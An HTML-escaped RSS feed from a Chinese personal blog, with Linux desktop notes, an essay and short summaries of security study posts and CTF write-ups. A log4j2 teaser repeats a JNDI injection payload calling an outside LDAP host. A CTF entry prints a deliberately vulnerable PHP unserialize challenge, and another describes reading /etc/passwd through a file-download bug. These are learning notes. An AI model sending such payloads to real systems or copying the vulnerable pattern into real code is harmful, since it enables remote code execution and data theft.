&lt;p&gt;最后，我和大部分的geek用户不一样，我比较笨，只是一个普通用户，我做不到也不想去和他们一样视鼠标如洪水猛兽，相反，sway下我还是会频繁使用鼠标，对我来说用鼠标去交互两个窗口的位置依旧是比用键盘更加高效的操作。&lt;strong&gt;所以我想说的是，追求属于自己的实用性，你可以去参考别人的建议，但是最终还是要找到属于你自己的习惯。&lt;/strong&gt; 对于我个人来说， 我也完全不排除在plasma的bug修复后回到plasma的可能性，毕竟老牌桌面。&lt;/p&gt;
&lt;p&gt;列出我使用的软件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;桌面环境
&lt;ul&gt;
&lt;li&gt;SwayWM（窗口管理）&lt;/li&gt;
&lt;li&gt;waybar（信息展示栏）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;终端
&lt;ul&gt;
&lt;li&gt;alacritty&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;浏览器
&lt;ul&gt;
&lt;li&gt;firefox-developer-edition （主力）&lt;/li&gt;
&lt;li&gt;chrome&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;输入法
&lt;ul&gt;
&lt;li&gt;fcitx5&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;代码编辑
&lt;ul&gt;
&lt;li&gt;Neovim（主力）&lt;/li&gt;
&lt;li&gt;Vscode（副手）&lt;/li&gt;
&lt;li&gt;Jetbrains&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;做笔记
&lt;ul&gt;
&lt;li&gt;Neovim-qt&lt;/li&gt;
&lt;li&gt;zotero&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;文件浏览器
&lt;ul&gt;
&lt;li&gt;ranger&lt;/li&gt;
&lt;li&gt;dolphin&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;看论文
&lt;ul&gt;
&lt;li&gt;zotero&lt;/li&gt;
&lt;li&gt;okular&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;游戏
&lt;ul&gt;
&lt;li&gt;steam（泰拉瑞亚、黑暗之魂……）&lt;/li&gt;
&lt;li&gt;waydroid（明日方舟）&lt;/li&gt;
&lt;li&gt;HMCL（minecraft）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;工具替代
&lt;ul&gt;
&lt;li&gt;exa 替代 ls&lt;/li&gt;
&lt;li&gt;zoxide 替代 cd&lt;/li&gt;
&lt;li&gt;scp 替代 cp&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;trouble-shooting&#34;&gt;Trouble Shooting&lt;/h2&gt;
&lt;h3 id=&#34;关机的时候出现-a-stoping-job-is-running-for-xxx-hangout&#34;&gt;关机的时候出现 a stoping job is running for xxx hangout&lt;/h3&gt;
&lt;p&gt;修改&lt;code&gt;/etc/systemd/system.conf&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>vim/neovim 的问题</title>
      <link>https://dragonbox.top/posts/tech-thinking-about-vim/</link>
      <pubDate>Thu, 15 Dec 2022 12:04:12 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-thinking-about-vim/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;在消磨三年时光之后，我终于明白这个编辑器还远远称不上稳定，在道路的尽头之前，我能做的其实只有观望。&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>在红米ac2100路由器上开启clash</title>
      <link>https://dragonbox.top/posts/tech-clash-ac2100/</link>
      <pubDate>Mon, 12 Dec 2022 20:17:03 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-clash-ac2100/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;在争取自由这个宏大命题下, 上网自由可以算得上一件&amp;quot;小事&amp;quot;, 然而越是小事, 越与我们的日常息息相关.&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>服务器过期之后</title>
      <link>https://dragonbox.top/posts/gossip-boring-note-md/</link>
      <pubDate>Mon, 12 Dec 2022 14:49:41 +0000</pubDate>
      <guid>https://dragonbox.top/posts/gossip-boring-note-md/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;超元域这个词, 出自雪崩这本书, 人们在这个虚拟世界中可以随意行事, 尽情做自己, 这也是我的初衷: 把发言权还给我&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>virtualbox中搭建kubernetes集群</title>
      <link>https://dragonbox.top/posts/tech-k8s-setup/</link>
      <pubDate>Mon, 12 Dec 2022 12:17:49 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-k8s-setup/</guid>
      <description>&lt;p&gt;环境问题, 一生之敌.&lt;/p&gt;</description>
    </item>
    <item>
      <title>2021年度总结</title>
      <link>https://dragonbox.top/posts/gossip-2021-summary/</link>
      <pubDate>Wed, 09 Feb 2022 16:12:20 +0000</pubDate>
      <guid>https://dragonbox.top/posts/gossip-2021-summary/</guid>
      <description>&lt;p&gt;这是一篇拖延了很久的年度总结,在下决心写它的时候,我已经从过年开始无所事事地玩了十几天的游戏了,本来说好要在过年那天写的总结也一直到现在才开始动笔,着实是惭愧.&lt;/p&gt;</description>
    </item>
    <item>
      <title>pwnable尝试</title>
      <link>https://dragonbox.top/posts/sec-pwnable/</link>
      <pubDate>Thu, 27 Jan 2022 17:48:33 +0000</pubDate>
      <guid>https://dragonbox.top/posts/sec-pwnable/</guid>
      <description>&lt;p&gt;尝试学pwn,放弃学pwn&lt;/p&gt;</description>
    </item>
    <item>
      <title>shiro 漏洞复现</title>
      <link>https://dragonbox.top/posts/sec-shiro-attack/</link>
      <pubDate>Sat, 22 Jan 2022 10:52:46 +0000</pubDate>
      <guid>https://dragonbox.top/posts/sec-shiro-attack/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;记录shiro漏洞学习的过程, 参考https://saucer-man.com/information_security/396.html, 并在漏洞分析基础上编写检测脚本&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>thinkphp5漏洞学习</title>
      <link>https://dragonbox.top/posts/sec-phpggc-thinkphp/</link>
      <pubDate>Fri, 14 Jan 2022 22:19:13 +0000</pubDate>
      <guid>https://dragonbox.top/posts/sec-phpggc-thinkphp/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;phpggc中关于thinkphp的攻击思路学习&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>log4j2 jndi 漏洞学习和调试</title>
      <link>https://dragonbox.top/posts/sec-log4j2-jndi/</link>
      <pubDate>Sat, 11 Dec 2021 14:56:51 +0000</pubDate>
      <guid>https://dragonbox.top/posts/sec-log4j2-jndi/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;明天安全圈校招面试:
面试官: 请说说你会什么技能?
我: ${jndi:ldap://xxx.dnslog.cn/exp}
面试官: 请说说你最近关注过的漏洞?
我: ${jndi:ldap://xxx.dnslog.cn/exp}
面试官: 你平时有动手调试过吗?
我: ${jndi:ldap://xxx.dnslog.cn/exp}
我：这dnslog是不是卡了 这面试官怎么还没rce&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>赛博内卷</title>
      <link>https://dragonbox.top/posts/gossip-cyberpunk/</link>
      <pubDate>Fri, 19 Nov 2021 11:18:11 +0000</pubDate>
      <guid>https://dragonbox.top/posts/gossip-cyberpunk/</guid>
      <description>&lt;p&gt;科技的发展并不代表内卷的避免,相反,一味追求在虚拟世界中开疆拓土,忽视宇宙和深海的探索开发正是人类社会内卷化的集中反映,此处的内卷,和通常的内卷定义相同,即&amp;quot;一类文化模式达到了某种最终的形态以后,既没有办法稳定下来,也没有办法转变为新的形态.而只能不断地在内部变得更加复杂的现象&amp;quot;,只不过对象从普通的小群体变成了全体人类,社会矛盾的频繁爆发让人类倾向于将自己的灵与肉奉献给虚拟的神,这种奉献的热诚背后充斥着对冰冷现实的无力感和逃避,即便这种虚拟是人类自己创造出来的,他们依旧选择忽视甚至忘却这种自知,选择被奴役,膜拜和瞻仰.&lt;/p&gt;
&lt;p&gt;另外一方面,正如洛夫克拉夫特所说的&amp;quot;人类最古老又最强烈的情绪,就是恐惧;而最古老又最强烈的恐惧,是对未知的恐惧&amp;quot;,在刻录在基因中的人性的驱使下,人类在总体层面上对未知的深海和太空是恐惧的,可是,要让人类接受自己社会发展停滞不前的事实,又是可耻且无法接受的.在这种背景下,虚拟世界的扩张从另一个角度为全体人类提供了一个&amp;quot;发展&amp;quot;的幻象,使得人类可以将蒙蔽双眼,逃脱生存困境,将注意力集中在已有事物的&amp;quot;发展&amp;quot;上,即便是内卷式的发展.&lt;/p&gt;
&lt;p&gt;从理性的角度来说,人类文明要想长存不休,必须要将触角极力扩张到太空和海洋当中,然而人类总体上呈现的是一种非理性的意识形态,这并不新奇,在上帝已死的年代里,人类相信的不再是神明而是科技和资本,而科技为资本所掌控,所以资本的信仰便是人类的信仰,乍看之下,资本代表着贪婪和逐利,并且具备一定程度上的理性,但可惜的是,正是这种信仰将虚拟世界捧上神坛并加剧了社会的内卷化,而这种情况很难发生改变,理由如下:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;资本并不具备引领人类社会向好发展的动机,资本行动的唯一动机是为自身逐利&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;资本理性的主体在&amp;quot;自己的寿命是有限的&amp;quot;这样一个前提下,会自发选择在&amp;quot;当下&amp;quot;时间点获利最大的发展方向&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当资本在一个领域中能或即将获取足够多利润,或者发现切换别的领域所付出的代价远大于自己所失去的时候,它将调用舆论吸引人类的注意力以期更大的利润空间&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;人类是盲从且愚昧的,尤其是在被消费社会阉割批判能力后基本上已经丧失了真正的自由意志,成为资本的牵线木偶.&lt;/p&gt;
&lt;p&gt;一个额外的发现是,如果将上述三个理由作为评判资本能力的标准,就会发现腾讯阿里巴巴等不靠科技驱动的公司才是资本意义上能力最强的公司,我担心这种内卷式的崛起会提醒其他资本,最大化的利润完全不需要科技创新,只需要靠&amp;quot;内卷&amp;quot;就可以了.或许,他们已经意识到了?&lt;/p&gt;
&lt;p&gt;其实很久以前就有人预测到了如今的现状,那就是赛伯朋克,它想告诉人们,科技的畸形发展不能解决而会加剧社会矛盾和人类的焦虑,可遗憾的是,在资本的操纵下,这种畸形的科技被繁复炫目的光影包装成了一种美学象征,这种人类的焦虑被刻意淡化甚至抹去,转而重新变成一种商品,一种无论是在商业意义还是精神意义上对资本力量更加有利的商品&amp;ndash;既谋取了利润,又扭曲了对抗虚拟的文学,这出&amp;quot;化敌为友&amp;quot;实在高明至极.&lt;/p&gt;
&lt;p&gt;赛博朋克指出了科技畸形发展所产生的问题,警告人们这样做的后果,但是很可惜,我们已经停不下来了,看起来,我们势必迈入赛伯朋克式的未来社会中,步履坚定,热切真诚.而到了那个时候,或者在那之前,也许更有价值的问题是:我们如何走出赛伯朋克?&lt;/p&gt;
&lt;p&gt;话说回来,在赛博朋克被提出的那个年代,根本没有人们如今看到的虚拟世界的哪怕一丝影子,我所能想到的,是这些科幻作家们凭借自身少得可怜的科技水平和对人性的充分了解所做出的猜测和臆想,或许他们创作的动机中,根本不包括一丝严肃批判的思考,而只是为了博人眼球来多赚点稿费罢了,但总之,他们猜中了,并且猜得更加超前.或许科技的发展史,就是一副肖像画,画的主题叫做人性.&lt;/p&gt;</description>
    </item>
    <item>
      <title>GhostCat(CVE-2020-1938)漏洞学习</title>
      <link>https://dragonbox.top/posts/sec-ghostcat/</link>
      <pubDate>Sat, 13 Nov 2021 13:14:29 +0000</pubDate>
      <guid>https://dragonbox.top/posts/sec-ghostcat/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;本文主要参考 &lt;a href=&#34;https://blog.csdn.net/qq_31481187/article/details/105917392&#34;&gt;https://blog.csdn.net/qq_31481187/article/details/105917392&lt;/a&gt; 和 &lt;a href=&#34;https://paper.seebug.org/1142/#_6&#34;&gt;https://paper.seebug.org/1142/#_6&lt;/a&gt; ，并无原创内容，仅仅是个人学习笔记。&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>mysql jdbc反序列化的不深入研究</title>
      <link>https://dragonbox.top/posts/sec-jdbc-unserialize/</link>
      <pubDate>Fri, 15 Oct 2021 21:46:28 +0000</pubDate>
      <guid>https://dragonbox.top/posts/sec-jdbc-unserialize/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;我终于更新博客了……&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>使用idea开启Servlet</title>
      <link>https://dragonbox.top/posts/tech-idea-start-servlet/</link>
      <pubDate>Thu, 01 Oct 2020 22:10:28 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-idea-start-servlet/</guid>
      <description>&lt;p&gt;采用的是版本较新的idea2020.2, 使用的操作系统为&lt;code&gt;MANJARO LINUX&lt;/code&gt;, 其中的过程挺迷迷糊糊的就水一篇来记录一下.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;File --&amp;gt; New --&amp;gt; Project --&amp;gt; Java --&amp;gt; Nextnext 新建一个项目
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;右键Project --&amp;gt; open module setting --&amp;gt; 点击+号 --&amp;gt; 导入tomcat8的Servlet-api.jar 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20211114141517710.png&#34; alt=&#34;image-20211114141517710&#34;  /&gt;
&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;右键项目 --&amp;gt; Add Frameworks Support --&amp;gt; 选中web application
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20211114141525898.png&#34; alt=&#34;image-20211114141525898&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;选中后会多出来几个东西, 如下图, 多了&lt;code&gt;WEB-INF&lt;/code&gt;目录和&lt;code&gt;index.jsp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20211114141531496.png&#34; alt=&#34;image-20211114141531496&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Web-INF&lt;/code&gt;里面有只有一个&lt;code&gt;web.xml&lt;/code&gt;, 什么是&lt;code&gt;WEB-INF&lt;/code&gt;? 根据百度百科的介绍&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。&lt;/p&gt;
&lt;p&gt;WEB-INF文件夹下除了web.xml外，还存一个classes文件夹，用以放置 *.class文件，这些 *.class文件是网站设计人员编写的类库，实现了jsp页面前台美工与后台服务的分离，使得网站的维护非常方便。web.xml文件为网站部署描述XML文件，对网站的部署非常重要。&lt;/p&gt;
&lt;p&gt;Web-Inf文件夹中除了有classes文件夹和一个web.xml文件外、还有lib文件夹（用于存放需要的jar包）（用于配置，比如说用来配置过滤器等。）&lt;/p&gt;
&lt;p&gt;/WEB-INF/src/
　　源码目录，按照包名结构放置各个java文件。&lt;/p&gt;
&lt;p&gt;/WEB-INF/database.properties
　　数据库配置文件&lt;/p&gt;
&lt;p&gt;/WEB-INF/tags/&lt;/p&gt;
&lt;p&gt;存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。例如：当自定义标签文件库名称为 simpleTags 时，在使用 simpleTags 目录下的标签文件时，就必须在 jsp 文件头声明为：&amp;lt;%@ taglibprefix=&amp;ldquo;tags&amp;rdquo; tagdir=&amp;quot;/WEB-INF /simpleTags&amp;quot; % &amp;gt;。&lt;/p&gt;
&lt;p&gt;/WEB-INF/jsp/&lt;/p&gt;
&lt;p&gt;jsp 1.2 以下版本的文件存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 。&lt;/p&gt;</description>
    </item>
    <item>
      <title>GACTF2020</title>
      <link>https://dragonbox.top/posts/ctf-gactf2020/</link>
      <pubDate>Sat, 29 Aug 2020 15:49:36 +0000</pubDate>
      <guid>https://dragonbox.top/posts/ctf-gactf2020/</guid>
      <description>&lt;h2 id=&#34;simpleflask&#34;&gt;simpleflask&lt;/h2&gt;
&lt;p&gt;和以往的flask不一样的地方在于, 这里是经过更新后的flask, 计算pin码的方式已经和以前不一样了, 参考 &lt;a href=&#34;https://www.chainnews.com/articles/898433701852.htm&#34;&gt;https://www.chainnews.com/articles/898433701852.htm&lt;/a&gt;, 不过问题不大,就把machine-id拼接在docker那一串东西的前面就可以了, 需要注意的是每十分钟重启时候的机器mac地址是会变化的.&lt;/p&gt;</description>
    </item>
    <item>
      <title>qwb2020web复现</title>
      <link>https://dragonbox.top/posts/ctf-qwb2020-web-1/</link>
      <pubDate>Thu, 27 Aug 2020 20:48:12 +0000</pubDate>
      <guid>https://dragonbox.top/posts/ctf-qwb2020-web-1/</guid>
      <description>&lt;h2 id=&#34;half_infiltration&#34;&gt;half_infiltration&lt;/h2&gt;
&lt;p&gt;开局的页面如下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;highlight_file&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$flag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ssrf.php&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Pass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;read&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;ob_start&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; $result;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; $result;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $age,$sex,$num;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $student &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $boy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sex&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $student&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;$boy();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;is_string&lt;/span&gt;($a)) &lt;span style=&#34;color:#f92672&#34;&gt;||!&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;is_string&lt;/span&gt;($boy)) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;is_object&lt;/span&gt;($student)))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;ob_end_clean&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; $$a;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $result&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$GLOBALS[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;ob_end_clean&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;])&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get_it&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;思路是进行两次反序列化, 第一次将$_GLOBALS[&amp;lsquo;flag&amp;rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在&lt;code&gt;ob_end_clean()&lt;/code&gt;执行之前报错退出. &lt;code&gt;ob_start&lt;/code&gt;会打开输出缓冲&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。&lt;/p&gt;</description>
    </item>
    <item>
      <title>http请求走私笔记</title>
      <link>https://dragonbox.top/posts/sec-http-smuggling/</link>
      <pubDate>Mon, 24 Aug 2020 22:22:46 +0000</pubDate>
      <guid>https://dragonbox.top/posts/sec-http-smuggling/</guid>
      <description>&lt;p&gt;正常的请求&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20211114141452612.png&#34; alt=&#34;image-20211114141452612&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>ciscn2020_online</title>
      <link>https://dragonbox.top/posts/ctf-ciscn2020-online/</link>
      <pubDate>Thu, 20 Aug 2020 13:16:50 +0000</pubDate>
      <guid>https://dragonbox.top/posts/ctf-ciscn2020-online/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;web越來越没有牌面了&amp;hellip;国赛果然是pwn和misc的天下&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>网鼎杯2020 web</title>
      <link>https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/</link>
      <pubDate>Mon, 11 May 2020 16:11:31 +0000</pubDate>
      <guid>https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/</guid>
      <description>&lt;h2 id=&#34;filejava&#34;&gt;filejava&lt;/h2&gt;
&lt;p&gt;提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://dragonbox.top/images/image-20200511193913736.png&#34; alt=&#34;image-20200511193913736&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;绝对路径&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;读文件/etc/passwd&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://dragonbox.top/images/image-20200511194357766.png&#34; alt=&#34;image-20200511194357766&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;读日志文件 &lt;code&gt;logs/catalina.out&lt;/code&gt;&lt;/p&gt;
